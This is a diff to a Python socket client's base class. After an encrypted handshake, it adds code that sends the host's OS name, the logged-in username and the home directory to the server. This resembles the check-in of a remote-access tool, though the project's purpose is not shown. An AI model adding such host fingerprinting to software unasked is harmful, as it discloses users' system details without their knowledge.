@@ -1,7 +1,10 @@
 """ Base Class for the Client, handles handshake, encryption and messages """
+import os
 import logging
 import socket
 import time
+import platform
+import getpass
 
 from cryptography.hazmat.primitives import hashes, padding, serialization
 from cryptography.hazmat.primitives.asymmetric import ec
@@ -103,6 +106,10 @@ class BaseClient:
             algorithm=algorithms.AES256(derived_key),
             mode=modes.CBC(iv)
         )
+
+        # Send system information
+        self.write(f'{platform.system()}\n{getpass.getuser()}\n{os.path.expanduser("~")}'.encode())
+
         logging.info('Handshake completed successfully')
 
     def _encrypt(self, data: bytes) -> bytes:
